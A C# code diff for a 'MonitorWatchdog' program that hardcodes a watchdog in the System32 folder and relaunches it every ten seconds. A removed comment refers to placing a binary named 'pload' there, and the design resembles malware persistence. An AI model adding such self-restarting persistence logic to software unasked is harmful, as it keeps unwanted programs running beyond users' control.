@@ -17,21 +17,14 @@ namespace MonitorWatchdog
 {
     public class MonitorWatchdog
     {
-        // Defaults to putting the file in the System32 directory and the binary name pload
-        public static string? BinaryPath { get; private set; }
-        public static string? BinaryName { get; private set; }
-        public static string? PrimaryWatchdogMutexName { get; private set; }
-        public static string? SecondaryWatchdogPath { get; private set; }
-        public static string? SecondaryWatchdogName { get; private set; }
-        public static string? PrimaryWatchdogPath { get; private set; }
-        public static string? PrimaryWatchdogName { get; private set; }
-        public static string? SecondaryWatchdogMutexName { get; private set; }
+        public static string? PrimaryWatchdogPath { get; private set; } = "C:\\Windows\\System32";
+        public static string? PrimaryWatchdogName { get; private set; } = "Wdog1";
+        public static string? PrimaryWatchdogMutexName { get; private set; } = "PrimaryWDog";
+
+
+
         static void Main(string[] args)
         {
-            string[] staticVars = { "BinaryPath", "BinaryName", "SecondaryWatchdogPath", "SecondaryWatchdogName", "SecondaryWatchdogMutexName", "PrimaryWatchdogMutexName", "PrimaryWatchdogPath", "PrimaryWatchdogName" };
-            watchdogHelper.watchdogHelper.LoadFromJson("Config.json", staticVars);
-
-            // Create or open the mutex to ensure only one instance is running
             using (Mutex mutex = new Mutex(false, PrimaryWatchdogMutexName, out bool isNewInstance))
             {
                 if (!isNewInstance)
@@ -51,11 +44,8 @@ namespace MonitorWatchdog
     //  loop for frequent checks
             while (true)
             {
-                if (watchdogHelper.watchdogHelper.IsMutexRunning(PrimaryWatchdogMutexName))
-                {
-                    watchdogHelper.watchdogHelper.CheckBinary(PrimaryWatchdogPath, PrimaryWatchdogName);
-                }
-
+                watchdogHelper.watchdogHelper.verifyFilePathsSourceAndDest(PrimaryWatchdogPath, PrimaryWatchdogName);
+                watchdogHelper.watchdogHelper.CheckAndRunWatchdog(PrimaryWatchdogPath, PrimaryWatchdogName, PrimaryWatchdogMutexName);
                 Thread.Sleep(10000); 
             }
         }
